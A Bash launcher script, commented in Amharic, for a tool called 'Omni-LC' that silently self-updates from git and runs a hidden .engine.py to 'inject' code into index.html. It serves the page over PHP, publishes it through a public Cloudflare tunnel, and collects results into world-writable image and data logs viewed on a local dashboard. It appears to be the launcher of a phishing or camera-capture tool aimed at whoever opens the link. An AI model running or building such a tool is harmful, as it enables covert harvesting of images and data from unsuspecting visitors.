#!/bin/bash

# --- የተሻሻሉ የከለር እና የስታይል ዓይነቶች ---
CYAN='\033[1;36m'
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
WHITE='\033[1;37m'
NC='\033[0m' 
BOLD='\033[1m'
UNDERLINE='\033[4m'

# --- የማጽጃ function ---
cleanup() {
    echo -e "\n${RED}${BOLD}[!] ሲስተሙ እየተዘጋ ነው...${NC}"
    killall php cloudflared > /dev/null 2>&1
    exit
}
trap cleanup SIGINT

# --- 1. የ ASCII አርት እና Header ---
draw_header() {
    local cols=$(tput cols)
    local art_text=$(cat << 'EOF'
  /$$$$$$                          /$$         /$$        /$$$$$$ 
 /$$__  $$                        |__/        | $$       /$$__  $$
| $$  \ $$ /$$$$$$/$$$$  /$$$$$$$  /$$        | $$      | $$  \__/
| $$  | $$| $$_  $$_  $$| $$__  $$| $$ /$$$$$$| $$      | $$      
| $$  | $$| $$ \ $$ \ $$| $$  \ $$| $$|______/| $$      | $$      
| $$  | $$| $$ | $$ | $$| $$  | $$| $$        | $$      | $$    $$
|  $$$$$$/| $$ | $$ | $$| $$  | $$| $$        | $$$$$$$$|  $$$$$$/
 \______/ |__/ |__/ |__/|__/  |__/|__/        |________/ \______/ 
EOF
)

    echo -e "${CYAN}${BOLD}"
    while IFS= read -r line; do
        printf "%*s\n" $(( (${#line} + cols) / 2 )) "$line"
    done <<< "$art_text"
    
    echo -e "${PURPLE}${BOLD}"
    printf "%*s\n" $(( (38 + cols) / 2 )) "Developed by Andualem Koriya [ANK]"
    echo -e "${YELLOW}${BOLD}"
    printf "%*s\n" $(( (28 + cols) / 2 )) "Omni-LC Version: 4.0.1"
    echo -e "${BLUE}${BOLD}"
    printf "%*s\n" $(( (44 + cols) / 2 )) "============================================"
    echo -e "${NC}"
}

# --- 2. የኔትወርክ እና አፕዴት ቼከር ---
check_update() {
    echo -e "${BLUE}${BOLD}[*] የኔትወርክ connection በመፈተሽ ላይ... 🌐${NC}"
    
    # ኔትወርክን ፈጣን በሆነ መንገድ መፈተሽ
    if ! timeout 3s ping -c 1 8.8.8.8 &> /dev/null; then
        echo -e "${RED}${BOLD}[!] የኢንተርኔት ግንኙነት የለም። በነባር ፋይሎች እንቀጥላለን...${NC}"
        return
    fi

    echo -e "${GREEN}${BOLD}[+] ኢንተርኔት ተገናኝቷል። ማሻሻያ በመፈለግ ላይ... 🔄${NC}"
    git fetch &> /dev/null
    LOCAL=$(git rev-parse @)
    REMOTE=$(git rev-parse @{u})

    if [ "$LOCAL" != "$REMOTE" ]; then
        echo -e "${WHITE}${BOLD}[!] አዲስ ማሻሻያ ተገኝቷል! በዝምታ (Smoothly) እየታደሰ ነው...${NC}"
        git reset --hard origin/main &> /dev/null
        echo -e "${GREEN}${BOLD}[✔] ሲስተሙ ታድሷል።${NC}"
        # አዲሱን ፋይል በጸጥታ ማስጀመር
        exec bash "$0" "$@"
    else
        echo -e "${GREEN}${BOLD}[✔] ሲስተሙ የቅርብ ጊዜ ማሻሻያ ላይ ነው።${NC}"
    fi
}

# --- ሰላምታ እና መጀመሪያ ---
# መጀመሪያ Header እንዳይጠፋ clear የምናደርገው አፕዴት ከሌለ ብቻ ነው
clear
draw_header
check_update

echo -e "${BLUE}${BOLD}--------------------------------------------${NC}"

# --- 3. ሲስተም ዝግጅት ---
echo -e "${YELLOW}${BOLD}[*] ሲስተሙን በማዘጋጀት ላይ... 🛠️${NC}"
mkdir -p logs/images core
touch logs/data.txt
chmod -R 777 logs core
killall php > /dev/null 2>&1

filename="index.html"

echo -e -n "${GREEN}${BOLD}[?]${NC} ${BOLD}የ Port ቁጥር (default: 8080): ${NC}"
read port
port=${port:-8080}

echo -e "${YELLOW}${BOLD}[*] ኢንጄክሽን እየተከናወነ ነው... 💉${NC}"
python3 .engine.py "$filename"
echo -e "${GREEN}${BOLD}[+] ኢንጄክሽን ተጠናቋል።${NC}"

echo -e "${YELLOW}${BOLD}[*] የ PHP ሰርቨርን በ Port $port እያስነሳሁ ነው... 🚀${NC}"
php -S 0.0.0.0:$port > /dev/null 2>&1 &
sleep 2

# --- 4. Cloudflare ክፍል ---
echo -e "${BLUE}${BOLD}--------------------------------------------${NC}"
echo -e "${PURPLE}${BOLD}[!] የ CLOUDFLARE ሊንክ እየተፈጠረ ነው... ☁️${NC}"

# ኢንተርኔት ከሌለ እዚህ ጋር ያቆማል
if ! timeout 3s ping -c 1 google.com &> /dev/null; then
    echo -e "${RED}${BOLD}[❌] ስህተት፦ ኢንተርኔት ስለሌለ ሊንክ ማመንጨት አልተቻለም!${NC}"
else
    rm -f .cftunnel.log
    cloudflared tunnel --url http://localhost:$port > .cftunnel.log 2>&1 &

    echo -n -e "${YELLOW}${BOLD}[*] ሊንኩን በመፈለግ ላይ "
    CF_URL=""
    for i in {1..30}; do
        echo -n "."
        sleep 1
        CF_URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cftunnel.log | head -n 1)
        if [ ! -z "$CF_URL" ]; then
            echo -e " ${GREEN}${BOLD}ተገኝቷል!${NC}"
            break
        fi
    done

    echo -e "\n"

    if [ -z "$CF_URL" ]; then
        echo -e "${RED}${BOLD}[-] ስህተት፦ Cloudflare ሊንክ መስጠት አልቻለም።${NC}"
    else
        echo -e "${GREEN}${BOLD}--------------------------------------------"
        echo -e "  ✅ ስራው ተጠናቋል! "
        echo -e "  🌐 የህዝብ ሊንክ: ${YELLOW}${UNDERLINE}$CF_URL${NC}"
        echo -e "  📊 ዳሽቦርድ: ${CYAN}${UNDERLINE}http://localhost:$port/core/dashboard.php${NC}"
        echo -e "${GREEN}${BOLD}--------------------------------------------${NC}"
        
        if command -v termux-open-url &> /dev/null; then
            termux-open-url "http://localhost:$port/core/dashboard.php"
        fi
    fi
fi

echo -e "${YELLOW}${BOLD}[i] ሲስተሙን ለማቆም CTRL+C ይጫኑ።${NC}"
wait
